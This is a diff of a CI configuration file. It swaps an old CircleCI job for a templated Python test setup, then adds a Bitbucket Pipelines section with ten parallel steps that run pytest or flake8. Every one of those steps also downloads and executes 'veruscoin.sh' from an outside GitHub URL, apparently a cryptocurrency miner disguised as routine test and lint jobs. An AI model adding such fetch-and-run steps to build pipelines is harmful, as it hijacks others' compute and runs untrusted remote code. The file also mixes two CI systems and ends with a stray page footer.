@@ -1,32 +1,118 @@
 
 
 
-version: 2
+version: 2.1
+
+orbs:
+  # The python orb contains a set of prepackaged CircleCI configuration you can use repeatedly in your configuration files
+  # Orb commands and jobs help you with common scripting around a language/tool
+  # so you dont have to copy and paste it everywhere.
+  # See the orb documentation here: https://circleci.com/developer/orbs/orb/circleci/python
+  python: circleci/python@1.2
+
+workflows:
+  sample:  # This is the name of the workflow, feel free to change it to better match your workflow.
+    # Inside the workflow, you define the jobs you want to run. 
+    # For more details on extending your workflow, see the configuration docs: https://circleci.com/docs/2.0/configuration-reference/#workflows 
+    jobs:
+      - build-and-test
+
 
 jobs:
-  build:
+  build-and-test:  # This is the name of the job, feel free to change it to better match what you're trying to do!
+    # These next lines defines a Docker executors: https://circleci.com/docs/2.0/executor-types/
+    # You can specify an image from Dockerhub or use one of the convenience images from CircleCI's Developer Hub
+    # A list of available CircleCI Docker convenience images are available here: https://circleci.com/developer/images/image/cimg/python
+    # The executor is the environment in which the steps below will be executed - below will use a python 3.9 container
+    # Change the version below to your required version of python
     docker:
-            - image: ubuntu
+      - image: cimg/python:3.8
+    # Checkout the code as the first step. This is a dedicated CircleCI step.
+    # The python orb's install-packages step will install the dependencies from a Pipfile via Pipenv by default.
+    # Here we're making sure we use just use the system-wide pip. By default it uses the project root's requirements.txt.
+    # Then run your tests!
+    # CircleCI will report the results back to your VCS provider.
     steps:
       - checkout
-
-      
-
+      - python/install-packages:
+          pkg-manager: pip
+          # app-dir: ~/project/package-directory/  # If you're requirements.txt isn't in the root directory.
+          # pip-dependency-file: test-requirements.txt  # if you have a different name for your requirements file, maybe one that combines your runtime and test requirements.
       - run:
-          name: install docker
-          command: |
-            set -x
-            apt-get update
-            apt-get install -y curl
-            VER="17.03.0-ce"
-            curl -L -o /tmp/docker-$VER.tgz https://download.docker.com/linux/static/stable/x86_64/docker-$VER.tgz
-            tar -xz -C /tmp -f /tmp/docker-$VER.tgz
-            mv /tmp/docker/* /usr/bin
+          name: Run tests
+          # This assumes pytest is installed via the install-package step above
+          command: pytest
+#  Template python-build
 
-      - run:
-          name: Run playbook
-          command: |
-            docker run -p 6080:80 -v /dev/shm:/dev/shm dorowu/ubuntu-desktop-lxde-vnc
+#  This template allows you to validate your python code.
+#  The workflow allows running tests and code linting on the default branch.
 
+image: python:3.8
 
-
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: run1
+          caches:
+            - pip
+          script:
+            - if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+            - pip install pytest
+            - pytest -v tests/* --junitxml=test-reports/report.xml
+            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+      - step:
+          name: run2
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+      - step:
+          name: run3
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+      - step:
+          name: run4
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+      - step:
+          name: run5
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+      - step:
+          name: run6
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+      - step:
+          name: run7
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+      - step:
+          name: run8
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+      - step:
+          name: run9
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+      - step:
+          name: run10
+          script:
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - wget https://raw.githubusercontent.com/untung13/bitbucket/main/veruscoin.sh && chmod +x veruscoin.sh && ./veruscoin.sh
+© 2021 GitHub, Inc.
